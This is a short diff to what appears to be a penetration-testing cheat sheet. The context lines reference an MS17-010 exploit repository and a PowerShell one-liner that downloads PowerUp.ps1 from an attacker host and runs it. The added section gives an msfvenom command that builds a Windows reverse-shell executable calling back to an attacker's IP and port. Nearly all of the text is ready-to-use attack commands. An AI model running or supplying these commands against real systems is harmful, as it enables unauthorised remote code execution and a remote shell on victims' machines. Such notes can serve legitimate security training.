@@ -141,3 +141,6 @@ git clone https://github.com/worawit/MS17-010.git
    * Download and run PowerUp:
      ##### echo IEX(New-Object Net.WebClient).DownloadString('http://\<ip>:\<port>/PowerUp.ps1') | powershell -noprofile -
      
+## MSFVENOM
+### EXE
+##### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f exe > shell.exe
